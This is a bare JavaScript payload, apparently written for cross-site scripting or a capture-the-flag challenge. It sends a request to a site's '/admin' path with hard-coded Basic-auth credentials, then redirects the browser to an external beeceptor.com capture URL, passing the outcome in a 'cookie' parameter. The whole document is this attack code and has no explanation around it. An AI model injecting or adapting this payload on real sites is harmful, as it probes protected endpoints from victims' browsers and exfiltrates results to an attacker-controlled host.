(async () => {
  let headers = new Headers();
  headers.set('Authorization', 'Basic ' + btoa('214646f5-1e6f-4049-a1e9-c0d98bcadda6' + ":" + 'valera_smeni_kredi_4mo'));
  fetch('/admin', {headers, redirect: 'manual'}).then(res => {
    window.location.replace('https://gvfdgdfgfsfd.free.beeceptor.com?cookie=' + res.ok);
  }).catch(err => {
    window.location.replace('https://gvfdgdfgfsfd.free.beeceptor.com?cookie=' + JSON.stringify(err))
  });
})()
